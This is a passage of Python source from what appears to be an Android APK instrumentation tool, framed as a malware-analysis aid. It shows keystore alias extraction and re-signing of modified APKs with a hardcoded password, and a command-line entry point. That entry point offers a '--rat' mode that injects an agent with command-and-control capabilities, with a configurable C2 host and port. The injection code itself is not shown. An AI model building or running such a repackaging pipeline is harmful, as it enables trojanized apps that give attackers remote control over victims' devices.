                    print(f"    [!] Signed but verification failed (alias={alias}), trying next...")
                    if os.path.exists(signed_path):
                        os.remove(signed_path)

        print(f"    [!] apksigner failed for all aliases")
        return None

    def _get_keystore_aliases(self, keystore: str) -> list[str]:
        """Extract aliases from a keystore file."""
        result = subprocess.run(
            ["keytool", "-list", "-keystore", keystore,
             "-storepass", "android", "-noprompt"],
            capture_output=True, text=True,
        )
        aliases = []
        for line in (result.stdout or "").splitlines():
            line = line.strip()
            if line and "," in line and "PrivateKeyEntry" in line:
                alias = line.split(",")[0].strip()
                if alias:
                    aliases.append(alias)
        return aliases

    def _build_sign_cmd(self, apk_path: str, signed_path: str,
                        keystore: str, apksigner: str, alias: str) -> list[str]:
        sign_args = [
            "sign",
            "--ks", keystore,
            "--ks-pass", "pass:android",
            "--key-pass", "pass:android",
            "--ks-key-alias", alias,
            "--v1-signing-enabled", "true",
            "--v2-signing-enabled", "true",
            "--v3-signing-enabled", "true",
            "--out", signed_path,
            apk_path,
        ]
        if apksigner.endswith(".jar"):
            return ["java", "-jar", apksigner] + sign_args
        return [apksigner] + sign_args

    def _verify_signature(self, apk_path: str, apksigner: str) -> bool:
        """Verify APK signature is valid."""
        if apksigner.endswith(".jar"):
            cmd = ["java", "-jar", apksigner, "verify", "--verbose", apk_path]
        else:
            cmd = [apksigner, "verify", "--verbose", apk_path]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.returncode == 0


def main():
    parser = argparse.ArgumentParser(
        description="APK Behavioral Instrumentor for Android malware analysis"
    )
    parser.add_argument("apk", help="Path to target APK")
    parser.add_argument("-o", "--output", default="./output",
                        help="Output directory (default: ./output)")
    parser.add_argument("--java-home", help="JAVA_HOME path")
    parser.add_argument("--android-sdk", help="ANDROID_HOME path")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--rat", action="store_true",
                        help="Enable RAT mode: inject agent with C2 capabilities")
    parser.add_argument("--c2-host", default="127.0.0.1",
                        help="C2 server host (default: 127.0.0.1)")
    parser.add_argument("--c2-port", type=int, default=8080,
                        help="C2 server port (default: 8080)")
    args = parser.parse_args()

    instrumentor = Instrumentor(
        apk_path=args.apk,
        output_dir=args.output,
        java_home=args.java_home,
        android_sdk=args.android_sdk,
        verbose=args.verbose,
        rat_mode=args.rat,
        c2_host=args.c2_host,
        c2_port=args.c2_port,
    )
    instrumentor.instrument()


if __name__ == "__main__":
    main()
